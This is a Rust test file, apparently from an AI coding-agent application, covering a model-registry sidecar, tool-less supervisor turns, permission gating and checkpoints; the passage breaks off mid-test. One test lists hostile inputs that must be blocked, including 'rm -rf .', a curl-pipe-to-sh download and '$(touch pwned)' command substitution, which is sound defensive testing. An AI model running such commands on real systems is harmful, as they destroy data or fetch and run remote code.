// Fake-sidecar tests hold a serial-execution MutexGuard across `.await`; the
// guard only serializes the test process-spawn path, so the deadlock risk the
// lint guards against does not apply here.
#![allow(clippy::await_holding_lock)]
use super::*;
use async_trait::async_trait;
use serde_json::json;
use std::sync::atomic::AtomicUsize;

use crate::agent::{
    AgentRunMode, AlwaysApproveHook, AwaitUserHook, PendingApprovals, PermissionDecision,
    PermissionHook, PermissionRequestContext, RunModePermissionHook, StepContext,
};
use crate::db::models::{CardState, NewCard};
use crate::tools::RiskLevel;

struct RecordingApproveHook {
    calls: Arc<AtomicUsize>,
}

#[async_trait]
impl PermissionHook for RecordingApproveHook {
    async fn intercept(
        &self,
        _call: &ToolCall,
        _risk: RiskLevel,
        _context: PermissionRequestContext,
    ) -> PermissionDecision {
        self.calls.fetch_add(1, Ordering::SeqCst);
        PermissionDecision::approved()
    }
}

/// Approves only after `delay`, modelling a student who deliberates on the
/// approval card longer than the turn budget.
struct SlowApproveHook {
    delay: Duration,
}

#[async_trait]
impl PermissionHook for SlowApproveHook {
    async fn intercept(
        &self,
        _call: &ToolCall,
        _risk: RiskLevel,
        _context: PermissionRequestContext,
    ) -> PermissionDecision {
        tokio::time::sleep(self.delay).await;
        PermissionDecision::approved()
    }
}

struct DelayedApproveHook {
    delay: Duration,
}

#[async_trait]
impl PermissionHook for DelayedApproveHook {
    async fn intercept(
        &self,
        _call: &ToolCall,
        _risk: RiskLevel,
        _context: PermissionRequestContext,
    ) -> PermissionDecision {
        tokio::time::sleep(self.delay).await;
        PermissionDecision::approved()
    }
}

fn create_test_db(project: &Path) -> (Arc<Mutex<crate::db::Database>>, i64) {
    let mut db = crate::db::Database::open_in_memory().unwrap();
    db.migrate().unwrap();
    let project_id = crate::db::dao::project::insert(
        db.conn(),
        &crate::db::models::NewProject {
            name: "phase-d".into(),
            path: project.display().to_string(),
            provider_default: None,
            model_default: None,
        },
    )
    .unwrap();
    let session_id = crate::db::dao::session::insert(
        db.conn(),
        &crate::db::models::NewSession {
            project_id,
            title: "phase-d".into(),
            ended_at: None,
            status: "active".into(),
        },
    )
    .unwrap();
    (Arc::new(Mutex::new(db)), session_id)
}

fn make_loop(
    project: &Path,
    db: Arc<Mutex<crate::db::Database>>,
    session_id: i64,
    run_mode: AgentRunMode,
    permission: Arc<dyn PermissionHook>,
    cancel: Option<Arc<AtomicBool>>,
) -> AgentLoop {
    let mut builder = AgentLoop::builder()
        .provider(std::sync::Arc::new(crate::providers::MockProvider::new(
            Vec::new(),
        )))
        .registry(std::sync::Arc::new(
            crate::tools::ToolRegistry::with_builtins(),
        ))
        .permission(permission)
        .db(db)
        .tool_ctx(crate::tools::ToolContext::new(project, session_id))
        .model(DEFAULT_MODEL)
        .run_mode(run_mode);
    if let Some(cancel) = cancel {
        builder = builder.cancel(cancel);
    }
    builder.build().unwrap()
}

fn run_mode_permission(
    mode: AgentRunMode,
    plan_accepted: bool,
    active_step_id: Option<i64>,
    inner: Arc<dyn PermissionHook>,
) -> Arc<dyn PermissionHook> {
    Arc::new(
        RunModePermissionHook::new(mode, inner)
            .with_plan_accepted(plan_accepted)
            .with_active_step_id(active_step_id),
    )
}

fn insert_current_card(db: &Arc<Mutex<crate::db::Database>>, session_id: i64, title: &str) -> i64 {
    let db = db.lock().unwrap();
    let card_id = crate::db::dao::card::insert(
        db.conn(),
        &NewCard {
            session_id,
            title: title.into(),
            instruction: Some("implement the current card".into()),
            assist_summary: None,
            acceptance_criteria: None,
            retrospective: None,
            change_summary: None,
            state: CardState::Instructed,
            verify_log: None,
            changed_files: None,
            test_command: None,
            approval_judgment: None,
            approval_provenance: None,
            position: 1,
        },
    )
    .unwrap();
    crate::db::dao::workmap::set_current_card(db.conn(), session_id, Some(card_id)).unwrap();
    card_id
}

fn insert_active_step_mapping(
    db: &Arc<Mutex<crate::db::Database>>,
    session_id: i64,
) -> StepContext {
    let db = db.lock().unwrap();
    let session = crate::db::dao::session::get_by_id(db.conn(), session_id)
        .unwrap()
        .unwrap();
    let plan_id = crate::db::dao::plan::insert(
        db.conn(),
        &crate::db::models::NewPlan {
            project_id: session.project_id,
            interview_id: None,
            goal: "Phase E active step".into(),
            intent_summary: None,
            scope: None,
            non_goals: None,
            constraints: None,
            acceptance_criteria: None,
            status: "approved".into(),
        },
    )
    .unwrap();
    let step_id = crate::db::dao::step::insert(
        db.conn(),
        &crate::db::models::NewStep {
            plan_id,
            step_id: "step-001".into(),
            title: "Harden Pi runtime".into(),
            summary: None,
            instruction_seed: Some("Exercise runtime abort handling".into()),
            expected_files: Some(json!(["src/pi_sidecar.rs"])),
            acceptance_criteria: Some(json!(["runtime aborts are retryable"])),
            step_kind: Default::default(),
            verification_kind: None,
            verification_command: None,
            verification_manual_check: None,
            dependencies: Some(json!([])),
            parallel_group: None,
            position: 1,
        },
    )
    .unwrap();
    crate::db::dao::step_session_mapping::insert(
        db.conn(),
        &crate::db::models::NewStepSessionMapping {
            step_id,
            session_id: Some(session_id),
            card_id: None,
            state_path: None,
            status: "in_progress".into(),
            started_at: Some(crate::db::now_ms()),
            completed_at: None,
            checkpoint_ids: Some(json!([])),
            verification_status: None,
            verification_evidence: None,
            user_decision: None,
        },
    )
    .unwrap();
    StepContext {
        step_id,
        title: "Harden Pi runtime".into(),
        instruction_seed: Some("Exercise runtime abort handling".into()),
        acceptance_criteria: Some("[\"runtime aborts are retryable\"]".into()),
        linked_criterion_ids: Vec::new(),
        decomposition_rationale: None,
        expected_files: Some("[\"src/pi_sidecar.rs\"]".into()),
        step_kind: Default::default(),
    }
}

fn tool_call(id: &str, name: &str, arguments: serde_json::Value) -> ToolCall {
    ToolCall {
        id: id.into(),
        name: name.into(),
        arguments: arguments.to_string(),
    }
}

fn event_kind(event: &AgentEvent) -> &'static str {
    match event {
        AgentEvent::UserMessage { .. } => "user_message",
        AgentEvent::RuntimeSelected { .. } => "runtime_selected",
        AgentEvent::RuntimeCapabilityEvaluated { .. } => "runtime_capability_evaluated",
        AgentEvent::RuntimeRoutingDecision { .. } => "runtime_routing_decision",
        AgentEvent::PreviewOpenRequested { .. } => "preview_open_requested",
        AgentEvent::PreviewOpenResult { .. } => "preview_open_result",
        AgentEvent::ProjectCommandResult { .. } => "project_command_result",
        AgentEvent::TerminalScriptResult { .. } => "terminal_script_result",
        AgentEvent::ToolApprovalStale { .. } => "tool_approval_stale",
        AgentEvent::AssistantStart { .. } => "assistant_start",
        AgentEvent::AssistantDelta { .. } => "assistant_delta",
        AgentEvent::AssistantEnd { .. } => "assistant_end",
        AgentEvent::Reasoning { .. } => "reasoning",
        AgentEvent::ToolCallStart { .. } => "tool_call_start",
        AgentEvent::ToolCallApproved { .. } => "tool_call_approved",
        AgentEvent::ToolCallDenied { .. } => "tool_call_denied",
        AgentEvent::ToolCallBlocked { .. } => "tool_call_blocked",
        AgentEvent::ToolResult { .. } => "tool_result",
        AgentEvent::AgentProgress { .. } => "agent_progress",
        AgentEvent::Error { .. } => "error",
        AgentEvent::Done { .. } => "done",
    }
}

fn event_kinds(events: &[AgentEvent]) -> Vec<&'static str> {
    events.iter().map(event_kind).collect()
}

fn write_fake_sidecar(dir: &Path, name: &str, body: &str) -> PathBuf {
    let script = dir.join(name);
    std::fs::write(&script, body).unwrap();
    script
}

static FAKE_SIDECAR_TEST_LOCK: OnceLock<Mutex<()>> = OnceLock::new();

fn fake_sidecar_test_lock() -> std::sync::MutexGuard<'static, ()> {
    FAKE_SIDECAR_TEST_LOCK
        .get_or_init(|| Mutex::new(()))
        .lock()
        .unwrap_or_else(|poisoned| poisoned.into_inner())
}

fn fake_sidecar_prelude() -> &'static str {
    r#"
import readline from "node:readline";
const rl = readline.createInterface({ input: process.stdin, crlfDelay: Infinity });
function emit(message) { process.stdout.write(`${JSON.stringify(message)}\n`); }
function ready(message) {
  const tools = (message.tools ?? []).map((tool) => tool.name).sort();
  emit({ type: "ready", request_id: message.request_id, model: `${message.provider}/${message.model}`, enabled_tools: tools });
}
"#
}

fn api_key_descriptor() -> PiProviderDescriptor {
    PiProviderDescriptor {
        pi_provider_id: "test-provider",
        credential_mode: CredentialMode::ApiKey,
    }
}

fn api_keyring(provider_config_id: i64) -> auth::InMemoryKeyring {
    let keyring = auth::InMemoryKeyring::new();
    auth::upsert_provider_api_key(&keyring, provider_config_id, "sk-test-secret").unwrap();
    keyring
}

fn set_supervisor_timeout_env(value: Option<&str>) {
    const KEY: &str = "DIVE_SUPERVISOR_TURN_TIMEOUT_MS";
    match value {
        Some(value) => std::env::set_var(KEY, value),
        None => std::env::remove_var(KEY),
    }
}

// S-051 D1/D2 point 2: sidecar `list_models` handshake + Rust cache.

#[tokio::test]
async fn list_models_end_to_end_against_real_sidecar_resolves_pinned_registry() {
    // No `set_test_sidecar_script_path` override here — this deliberately
    // exercises the REAL production dive/pi-sidecar/src/main.mjs (via
    // `resolve_sidecar_command`'s dev fallback) so the protocol addition
    // to index.mjs is covered end-to-end, not just against a fake stub.
    // `list_models` is a pure local registry lookup (no credentials, no
    // network egress — S-051 D1), so this is safe and deterministic to
    // run in CI. Still serialized: a concurrent test's script-path
    // override must not leak into this one.
    let _serial = fake_sidecar_test_lock();

    let providers = model_registry::query_model_registry()
        .await
        .expect("real pi sidecar answers list_models");

    assert!(
        providers.contains_key("anthropic"),
        "expected pinned registry to know about the anthropic provider"
    );
    assert!(
        providers.contains_key("openrouter"),
        "expected pinned registry to know about the openrouter provider"
    );
    let anthropic_models = &providers["anthropic"];
    assert!(
        !anthropic_models.is_empty(),
        "anthropic provider should resolve at least one model"
    );
    assert!(
        anthropic_models.iter().all(|id| !id.is_empty()),
        "every resolved model id should be a non-empty string"
    );
}

// S-051 D4: factory-default CI gate. Advertised defaults/fallbacks must never
// outrun what the pinned pi-ai registry can actually execute (the rc.7
// `claude-sonnet-5` gap this stage exists to fix and lock shut). Defaults are
// pulled from the live factory functions — never a hand-copied string list —
// so a future default bump that outruns the pinned registry fails this test
// instead of shipping. Scoped to the provider kinds Pi actually drives
// (`pi_provider_descriptor` returns `Some`); kinds with no Pi execution path
// (opencode_zen, custom-openai) make no Pi-executability claim to gate.
#[tokio::test]
async fn factory_defaults_and_curated_fallbacks_resolve_in_pinned_pi_registry() {
    let _serial = fake_sidecar_test_lock();

    let providers = model_registry::query_model_registry()
        .await
        .expect("real pi sidecar answers list_models");

    for kind in ["anthropic", "openai", "openrouter", "codex"] {
        let provider_kind = crate::ipc::provider_runtime::ProviderKind::parse(kind);
        let Some(descriptor) = parity::pi_provider_descriptor(provider_kind) else {
            panic!(
                "DIVE provider kind `{kind}` is expected to be Pi-eligible (used in the \
                     anthropic/openai/openrouter/codex allowlist) but pi_provider_descriptor \
                     returned None; update this test's kind list if that allowlist changed"
            );
        };
        let pi_provider_id = descriptor.pi_provider_id;
        let resolved = providers.get(pi_provider_id).unwrap_or_else(|| {
            panic!(
                "pinned pi-ai registry has no `{pi_provider_id}` provider at all \
                     (DIVE kind `{kind}`); registry drift or provider id mismatch"
            )
        });

        let default_model = crate::providers::factory::default_model_for_kind(kind);
        assert!(
            resolved.contains(default_model),
            "factory default `{kind}`/`{default_model}` (pi provider `{pi_provider_id}`) \
                 does not resolve in the pinned pi-ai registry — the advertised default has \
                 outrun the bundled sidecar's registry (S-051 D4)"
        );

        for curated in crate::providers::factory::models_for_kind(kind) {
            assert!(
                resolved.contains(&curated.id),
                "curated fallback `{kind}`/`{}` (pi provider `{pi_provider_id}`) does not \
                     resolve in the pinned pi-ai registry — the curated catalog has outrun the \
                     bundled sidecar's registry (S-051 D4)",
                curated.id
            );
        }
    }
}

#[tokio::test]
async fn pi_model_registry_cache_answers_true_and_false_after_successful_load() {
    let _serial = fake_sidecar_test_lock();
    let scripts = tempfile::tempdir().unwrap();
    let script = write_fake_sidecar(
        scripts.path(),
        "list-models-fake.mjs",
        &format!(
            r#"{}
rl.on("line", (line) => {{
  const message = JSON.parse(line);
  if (message.type === "list_models") {{
    emit({{
      type: "list_models_result",
      providers: {{
        anthropic: ["claude-sonnet-4-6"],
        openrouter: ["anthropic/claude-sonnet-4-6"]
      }}
    }});
    rl.close();
    return;
  }}
  emit({{ type: "error", message: `unknown message type: ${{message.type}}` }});
}});
"#,
            fake_sidecar_prelude()
        ),
    );
    let _guard = set_test_sidecar_script_path(script);

    let cache = PiModelRegistryCache::new();
    assert_eq!(
        cache.executable("anthropic", "claude-sonnet-4-6").await,
        Some(true)
    );
    assert_eq!(
        cache.executable("anthropic", "claude-sonnet-5").await,
        Some(false)
    );
    // Second call must not re-spawn the sidecar: the cache is loaded once
    // per process lifetime (see PiModelRegistryCache doc comment).
    assert_eq!(
        cache
            .executable("openrouter", "anthropic/claude-sonnet-4-6")
            .await,
        Some(true)
    );
}

#[tokio::test]
async fn pi_model_registry_cache_fails_open_when_sidecar_does_not_understand_list_models() {
    // Models an old/stale bundled sidecar build that predates the
    // `list_models` protocol addition: it falls through to the existing
    // "unknown message type" error, exactly like production index.mjs
    // does for any message it doesn't recognize.
    let _serial = fake_sidecar_test_lock();
    let scripts = tempfile::tempdir().unwrap();
    let script = write_fake_sidecar(
        scripts.path(),
        "old-sidecar-fake.mjs",
        &format!(
            r#"{}
rl.on("line", (line) => {{
  const message = JSON.parse(line);
  emit({{ type: "error", message: `unknown message type: ${{message.type}}` }});
}});
"#,
            fake_sidecar_prelude()
        ),
    );
    let _guard = set_test_sidecar_script_path(script);

    let cache = PiModelRegistryCache::new();
    assert_eq!(
        cache.executable("anthropic", "claude-sonnet-5").await,
        None,
        "unanswerable registry must fail open, not block capability"
    );
}

#[test]
fn supervisor_turn_timeout_defaults_to_realistic_budget() {
    let _serial = fake_sidecar_test_lock();
    set_supervisor_timeout_env(None);

    assert_eq!(supervisor_turn_timeout(), Duration::from_secs(12));
}

#[test]
fn supervisor_turn_timeout_env_override_is_bounded() {
    let _serial = fake_sidecar_test_lock();

    set_supervisor_timeout_env(Some("250"));
    assert_eq!(supervisor_turn_timeout(), Duration::from_millis(1_200));

    set_supervisor_timeout_env(Some("6000"));
    assert_eq!(supervisor_turn_timeout(), Duration::from_secs(6));

    set_supervisor_timeout_env(Some("60000"));
    assert_eq!(supervisor_turn_timeout(), Duration::from_secs(15));

    set_supervisor_timeout_env(None);
}

async fn live_api_key_provider_parity_smoke(
    pi_provider_id: &'static str,
    api_key_env: &str,
    model_env: &str,
) {
    let api_key = std::env::var(api_key_env)
        .unwrap_or_else(|_| panic!("set {api_key_env} for live Pi parity smoke"));
    let model =
        std::env::var(model_env).unwrap_or_else(|_| panic!("set {model_env} for live smoke"));
    let provider_config_id = 9001;
    let keyring = auth::InMemoryKeyring::new();
    auth::upsert_provider_api_key(&keyring, provider_config_id, api_key.trim()).unwrap();

    let project = tempfile::tempdir().unwrap();
    std::fs::write(
        project.path().join("provider-parity.txt"),
        "provider parity",
    )
    .unwrap();
    let (db, session_id) = create_test_db(project.path());
    let loop_ = make_loop(
        project.path(),
        db,
        session_id,
        AgentRunMode::Plan,
        run_mode_permission(AgentRunMode::Plan, false, None, Arc::new(AlwaysApproveHook)),
        None,
    );
    let descriptor = PiProviderDescriptor {
        pi_provider_id,
        credential_mode: CredentialMode::ApiKey,
    };
    let mut loop_with_model = loop_;
    loop_with_model.model = model;
    let mut events = Vec::new();
    let result = run_supervised_turn(
            &keyring,
            &descriptor,
            provider_config_id,
            &loop_with_model,
            session_id,
            "Use the read_file tool exactly once with path \"provider-parity.txt\". Then reply exactly DIVE_PI_PROVIDER_PARITY_OK and nothing else.",
            None,
            &mut |event| events.push(event),
        )
        .await
        .expect("live provider Pi parity smoke");

    assert_eq!(result.tool_calls_seen, 1);
    assert_eq!(result.assistant_text, "DIVE_PI_PROVIDER_PARITY_OK");
    assert!(events
        .iter()
        .any(|event| matches!(event, AgentEvent::ToolResult { success: true, .. })));
}

#[test]
fn renders_external_messages_for_pi_with_role_boundaries() {
    let rendered = render_messages_for_pi(&[
        ProviderMessage::System {
            content: "system hint".into(),
        },
        ProviderMessage::User {
            content: "latest request".into(),
        },
    ]);
    assert!(rendered.contains("<system>\nsystem hint\n</system>"));
    assert!(rendered.contains("<user>\nlatest request\n</user>"));
    assert!(rendered.contains("Use only the DIVE tools"));
}

#[test]
fn sorted_tool_names_is_stable() {
    let tools = vec![
        ToolDef {
            name: "write_file".into(),
            description: String::new(),
            parameters: serde_json::json!({"type":"object"}),
        },
        ToolDef {
            name: "read_file".into(),
            description: String::new(),
            parameters: serde_json::json!({"type":"object"}),
        },
    ];
    assert_eq!(sorted_tool_names(&tools), ["read_file", "write_file"]);
}

#[test]
fn run_message_carries_provider_descriptor_not_hardcoded_codex() {
    let msg = build_run_message(
        "req-1",
        &parity::PiProviderDescriptor {
            pi_provider_id: "openai",
            credential_mode: parity::CredentialMode::ApiKey,
        },
        "gpt-5.4-mini",
        "/proj",
        None,
        Some("sk-test"),
        "hi",
        &[],
    );
    assert_eq!(msg["provider"], "openai");
    assert_eq!(msg["model"], "gpt-5.4-mini");
    assert_eq!(msg["api_key"], "sk-test");
    assert!(msg.get("auth_path").is_none() || msg["auth_path"].is_null());
}

#[test]
fn run_message_sends_explicit_empty_tools_for_interview_turns() {
    // Interview-mode turns expose zero tools. The `tools` field must be present
    // and empty so the sidecar does NOT fall back to its smoke `dive_context`
    // default (which would fail the enabled-tools parity check).
    let msg = build_run_message(
        "req-interview",
        &parity::PiProviderDescriptor {
            pi_provider_id: "anthropic",
            credential_mode: parity::CredentialMode::ApiKey,
        },
        "claude-test",
        "/proj",
        None,
        Some("sk-test"),
        "hi",
        &[],
    );
    assert_eq!(msg["tools"], json!([]));
}

#[test]
fn pi_sidecar_supervisor_run_message_sends_explicit_zero_tools() {
    let msg = build_run_message(
        "req-supervisor",
        &parity::PiProviderDescriptor {
            pi_provider_id: "openai-codex",
            credential_mode: parity::CredentialMode::OauthFile,
        },
        "gpt-5.4-mini",
        "/proj",
        Some(Path::new("/tmp/auth.json")),
        None,
        "{\"schemaVersion\":1,\"event\":\"verify_entered\"}",
        &[],
    );

    assert_eq!(msg["tools"], json!([]));
    assert!(
        !msg.to_string().contains("dive_context"),
        "SupervisorAgent must not inherit the smoke fallback tool"
    );
}

#[test]
fn pi_sidecar_supervisor_boundary_scaffold_rejects_resource_discovered_tools() {
    fn assert_supervisor_enabled_tools_empty(enabled_tools: &[String]) -> Result<(), String> {
        if enabled_tools.is_empty() {
            Ok(())
        } else {
            Err(format!(
                "SupervisorAgent ready.enabled_tools must be empty, got {:?}",
                enabled_tools
            ))
        }
    }

    assert!(assert_supervisor_enabled_tools_empty(&[]).is_ok());
    let resource_discovered_tools = vec!["dive_context".to_string()];
    let err = assert_supervisor_enabled_tools_empty(&resource_discovered_tools).unwrap_err();
    assert!(err.contains("ready.enabled_tools must be empty"));
    assert!(err.contains("dive_context"));
}

#[tokio::test]
async fn pi_sidecar_supervisor_turn_uses_explicit_zero_tools_and_no_resource_prompt() {
    let _serial = fake_sidecar_test_lock();
    let project = tempfile::tempdir().unwrap();
    let scripts = tempfile::tempdir().unwrap();
    let script = write_fake_sidecar(
        scripts.path(),
        "supervisor-zero-tools.mjs",
        &format!(
            r#"{}
rl.on("line", (line) => {{
  const message = JSON.parse(line);
  if (message.type !== "run") return;
  if (!Array.isArray(message.tools) || message.tools.length !== 0) {{
    emit({{ type: "error", request_id: message.request_id, message: "supervisor tools were not []" }});
    return;
  }}
  if (message.prompt.includes("dive_context") || message.prompt.includes("AGENTS.md") || message.prompt.includes(".specify")) {{
    emit({{ type: "error", request_id: message.request_id, message: "resource-discovered instruction leaked" }});
    return;
  }}
  ready(message);
  emit({{
    type: "turn_succeeded",
    request_id: message.request_id,
    assistant_text: "{{\"schemaVersion\":1,\"provoke\":false}}"
  }});
}});
"#,
            fake_sidecar_prelude()
        ),
    );
    let _guard = set_test_sidecar_script_path(script);
    let provider_config_id = 601;
    let keyring = api_keyring(provider_config_id);

    let result = run_supervisor_turn(
        &keyring,
        &api_key_descriptor(),
        provider_config_id,
        project.path().to_path_buf(),
        "test-model".to_string(),
        "Return exactly one JSON object. SupervisorContext JSON: {}".to_string(),
        Duration::from_secs(2),
    )
    .await
    .unwrap();

    assert_eq!(result.enabled_tools, Vec::<String>::new());
    assert_eq!(
        result.assistant_text,
        "{\"schemaVersion\":1,\"provoke\":false}"
    );
    assert_eq!(result.provider_config_id, provider_config_id);
}

#[tokio::test]
async fn pi_sidecar_supervisor_turn_rejects_enabled_tools_from_ready_event() {
    let _serial = fake_sidecar_test_lock();
    let project = tempfile::tempdir().unwrap();
    let scripts = tempfile::tempdir().unwrap();
    let script = write_fake_sidecar(
        scripts.path(),
        "supervisor-ready-tools.mjs",
        &format!(
            r#"{}
rl.on("line", (line) => {{
  const message = JSON.parse(line);
  if (message.type !== "run") return;
  emit({{
    type: "ready",
    request_id: message.request_id,
    model: `${{message.provider}}/${{message.model}}`,
    enabled_tools: ["dive_context"]
  }});
  emit({{ type: "turn_succeeded", request_id: message.request_id, assistant_text: "{{}}" }});
}});
"#,
            fake_sidecar_prelude()
        ),
    );
    let _guard = set_test_sidecar_script_path(script);
    let provider_config_id = 602;
    let keyring = api_keyring(provider_config_id);

    let err = run_supervisor_turn(
        &keyring,
        &api_key_descriptor(),
        provider_config_id,
        project.path().to_path_buf(),
        "test-model".to_string(),
        "supervisor prompt".to_string(),
        Duration::from_secs(2),
    )
    .await
    .unwrap_err();

    assert_eq!(err.kind, PiSidecarSupervisorErrorKind::SidecarError);
    assert!(err.message.contains("ready.enabled_tools must be empty"));
    assert!(err.message.contains("dive_context"));
}

#[tokio::test]
async fn pi_sidecar_supervisor_turn_rejects_any_tool_call() {
    let _serial = fake_sidecar_test_lock();
    let project = tempfile::tempdir().unwrap();
    let scripts = tempfile::tempdir().unwrap();
    let script = write_fake_sidecar(
        scripts.path(),
        "supervisor-tool-call.mjs",
        &format!(
            r#"{}
rl.on("line", (line) => {{
  const message = JSON.parse(line);
  if (message.type !== "run") return;
  ready(message);
  emit({{
    type: "tool_call",
    request_id: message.request_id,
    tool_call_id: "bad_tool",
    name: "read_file",
    params: {{ path: "secret.txt" }}
  }});
}});
"#,
            fake_sidecar_prelude()
        ),
    );
    let _guard = set_test_sidecar_script_path(script);
    let provider_config_id = 603;
    let keyring = api_keyring(provider_config_id);

    let err = run_supervisor_turn(
        &keyring,
        &api_key_descriptor(),
        provider_config_id,
        project.path().to_path_buf(),
        "test-model".to_string(),
        "supervisor prompt".to_string(),
        Duration::from_secs(2),
    )
    .await
    .unwrap_err();

    assert_eq!(err.kind, PiSidecarSupervisorErrorKind::SidecarError);
    assert!(err.message.contains("unexpected tool call"));
    assert!(err.message.contains("read_file"));
}

#[tokio::test]
async fn supervised_tool_execution_uses_run_mode_permission() {
    let project = tempfile::tempdir().unwrap();
    let mut db = crate::db::Database::open_in_memory().unwrap();
    db.migrate().unwrap();
    let project_id = crate::db::dao::project::insert(
        db.conn(),
        &crate::db::models::NewProject {
            name: "phase3-permission".into(),
            path: project.path().display().to_string(),
            provider_default: None,
            model_default: None,
        },
    )
    .unwrap();
    let session_id = crate::db::dao::session::insert(
        db.conn(),
        &crate::db::models::NewSession {
            project_id,
            title: "phase3-permission".into(),
            ended_at: None,
            status: "active".into(),
        },
    )
    .unwrap();
    let loop_ = AgentLoop::builder()
        .provider(std::sync::Arc::new(crate::providers::MockProvider::new(
            Vec::new(),
        )))
        .registry(std::sync::Arc::new(
            crate::tools::ToolRegistry::with_builtins(),
        ))
        .permission(std::sync::Arc::new(
            crate::agent::RunModePermissionHook::new(
                crate::agent::AgentRunMode::Plan,
                std::sync::Arc::new(crate::agent::AlwaysApproveHook),
            ),
        ))
        .db(std::sync::Arc::new(std::sync::Mutex::new(db)))
        .tool_ctx(crate::tools::ToolContext::new(project.path(), session_id))
        .run_mode(crate::agent::AgentRunMode::Plan)
        .build()
        .unwrap();

    let tc = ToolCall {
        id: "call_1".into(),
        name: "write_file".into(),
        arguments: serde_json::json!({
            "path": "blocked.txt",
            "content": "should not be written"
        })
        .to_string(),
    };
    let mut events = Vec::new();
    let out = loop_
        .execute_supervised_tool_call(session_id, &tc, &mut |event| events.push(event))
        .await
        .unwrap();
    assert!(!out.success);
    assert!(!project.path().join("blocked.txt").exists());
    assert!(events.iter().any(|event| matches!(
        event,
        AgentEvent::ToolCallDenied { id, .. } if id == "call_1"
    )));
}

#[tokio::test]
async fn supervised_run_process_blocks_shells_metacharacters_and_keeps_valid_argv() {
    let project = tempfile::tempdir().unwrap();
    let (db, session_id) = create_test_db(project.path());
    let loop_ = make_loop(
        project.path(),
        db,
        session_id,
        AgentRunMode::Build,
        run_mode_permission(
            AgentRunMode::Build,
            true,
            Some(1),
            Arc::new(AlwaysApproveHook),
        ),
        None,
    );

    let blocked_inputs = vec![
        json!({ "command": "bash", "args": ["-lc", "echo hi"] }),
        json!({ "command": "sh", "args": ["-c", "echo hi"] }),
        json!({ "command": "cmd", "args": ["/C", "echo hi"] }),
        json!({ "command": "powershell", "args": ["-Command", "echo hi"] }),
        json!({ "command": "pwsh", "args": ["-Command", "echo hi"] }),
        json!({ "command": "echo hello; rm -rf ." }),
        json!({ "command": "echo", "args": ["hello; rm -rf ."] }),
        json!({ "command": "curl", "args": ["example.invalid", "|", "sh"] }),
        json!({ "command": "echo", "args": ["$(touch pwned)"] }),
        json!({ "command": "echo", "args": ["> out.txt"] }),
        json!({ "command": "echo", "args": ["line\nbreak"] }),
    ];

    for (idx, args) in blocked_inputs.into_iter().enumerate() {
        let tc = tool_call(&format!("blocked_{idx}"), "run_process", args);
        let mut events = Vec::new();
        let out = loop_
            .execute_supervised_tool_call(session_id, &tc, &mut |event| events.push(event))
            .await
            .unwrap();
        assert!(!out.success, "blocked run_process unexpectedly succeeded");
        assert!(
            out.summary.contains("invalid input")
                || out.summary.contains("path denied")
                || out.summary.contains("not allowed"),
            "unexpected rejection summary: {}",
            out.summary
        );
        assert!(
            !events
                .iter()
                .any(|event| matches!(event, AgentEvent::ToolCallApproved { id } if id == &tc.id)),
            "invalid run_process reached approval path: {}",
            tc.id
        );
    }

    assert!(
        !project.path().join("pwned").exists(),
        "shell substitution payload must not execute"
    );

    let valid = tool_call(
        "valid_rustc",
        "run_process",
        json!({ "command": "rustc", "args": ["--version"], "timeout_sec": 5 }),
    );
    let mut events = Vec::new();
    let out = loop_
        .execute_supervised_tool_call(session_id, &valid, &mut |event| events.push(event))
        .await
        .unwrap();
    assert!(out.success, "valid direct argv failed: {}", out.summary);
    assert!(out.full["stdout"].as_str().unwrap_or("").contains("rustc"));
    assert!(events
        .iter()
        .any(|event| matches!(event, AgentEvent::ToolCallApproved { id } if id == "valid_rustc")));
}

#[tokio::test]
async fn supervised_write_creates_pre_edit_checkpoint_when_tree_dirty() {
    let project = tempfile::tempdir().unwrap();
    let (db, session_id) = create_test_db(project.path());
    let engine = crate::checkpoint::CheckpointEngine::new(project.path(), db.clone());
    engine.init().unwrap();
    // Dirty the working tree relative to the init checkpoint so the pre-edit
    // anchor has something to protect.
    std::fs::write(project.path().join("dirty.txt"), "uncommitted").unwrap();

    let loop_ = make_loop(
        project.path(),
        db.clone(),
        session_id,
        AgentRunMode::Build,
        run_mode_permission(
            AgentRunMode::Build,
            true,
            Some(1),
            Arc::new(AlwaysApproveHook),
        ),
        None,
    );
    let tc = tool_call(
        "w1",
        "write_file",
        json!({ "path": "new.txt", "content": "hello" }),
    );
    let out = loop_
        .execute_supervised_tool_call(session_id, &tc, &mut |_event| {})
        .await
        .unwrap();
    assert!(out.success, "write_file failed: {}", out.summary);

    let list = engine.list_checkpoints(session_id).unwrap();
    assert!(
        list.iter().any(|c| c.kind == "auto-pre-edit"),
        "approved write must create a pre-edit anchor, got {list:?}"
    );
}

#[tokio::test]
async fn supervised_read_only_tool_creates_no_pre_edit_checkpoint() {
    let project = tempfile::tempdir().unwrap();
    std::fs::write(project.path().join("readme.txt"), "content").unwrap();
    let (db, session_id) = create_test_db(project.path());
    let engine = crate::checkpoint::CheckpointEngine::new(project.path(), db.clone());
    engine.init().unwrap();
    std::fs::write(project.path().join("dirty.txt"), "uncommitted").unwrap();

    let loop_ = make_loop(
        project.path(),
        db.clone(),
        session_id,
        AgentRunMode::Build,
        run_mode_permission(
            AgentRunMode::Build,
            true,
            Some(1),
            Arc::new(AlwaysApproveHook),
        ),
        None,
    );
    let tc = tool_call("r1", "read_file", json!({ "path": "readme.txt" }));
    loop_
        .execute_supervised_tool_call(session_id, &tc, &mut |_event| {})
        .await
        .unwrap();

    let list = engine.list_checkpoints(session_id).unwrap();
    assert!(
        !list.iter().any(|c| c.kind == "auto-pre-edit"),
        "read-only tool must not create a pre-edit anchor, got {list:?}"
    );
}

#[tokio::test]
#[cfg(unix)]
async fn supervised_run_process_emits_bounded_project_command_evidence() {
    let project = tempfile::tempdir().unwrap();
    let (db, session_id) = create_test_db(project.path());
    let loop_ = make_loop(
        project.path(),
        db.clone(),
        session_id,
        AgentRunMode::Build,
        run_mode_permission(
            AgentRunMode::Build,
            true,
            Some(1),
            Arc::new(AlwaysApproveHook),
        ),
        None,
    );
    let long_stdout = "x".repeat(20 * 1024);
    let tc = tool_call(
        "cmd_evidence",
        "run_process",
        json!({
            "command": "printf",
            "args": [long_stdout],
            "timeout_sec": 5,
            "reason": "Run the direct verification command.",
            "expected_effect": "Prints bounded output without shell expansion."
        }),
    );
    let mut events = Vec::new();
    let out = loop_
        .execute_supervised_tool_call(session_id, &tc, &mut |event| events.push(event))
        .await
        .unwrap();
    assert!(out.success);

    let command_event = events
        .iter()
        .find_map(|event| match event {
            AgentEvent::ProjectCommandResult {
                tool_call_id,
                command_label,
                executable,
                timeout_sec,
                reason,
                expected_effect,
                success,
                exit_code,
                stdout_summary,
                ..
